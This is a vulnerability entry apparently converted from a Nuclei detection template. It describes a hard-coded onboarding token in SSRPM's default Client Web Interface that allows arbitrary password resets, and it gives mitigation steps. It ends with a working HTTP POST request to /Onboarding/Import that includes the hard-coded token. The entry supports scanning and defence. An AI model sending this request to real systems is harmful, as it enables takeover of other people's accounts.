# Vulnerability: SSRPM - Arbitary Password Reset on Default Client Interface Installation
**Classification:** SSRPM
**Source:** Nuclei Template (`ssrpm-arbitrary-password-reset.yaml`)

## Description
The default installation of the Client Web Interface, which is provided alongside the COM SSRPM service, defines a hard-coded secret token for the Import endpoint. This endpoint allows registering new accounts or overwriting existing onboarding data for an arbitrary account, which ultimately allows changing the password of an arbitrary account.

## Secure Mitigation
Set a new and random value to the OnboardingToken setting. Install the new version of SSRPM and its web interface.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /Onboarding/Import HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

OnboardingToken=7e30bebc-d17c-4833-98b6-d4c09e076b24&Action={{string}}
```

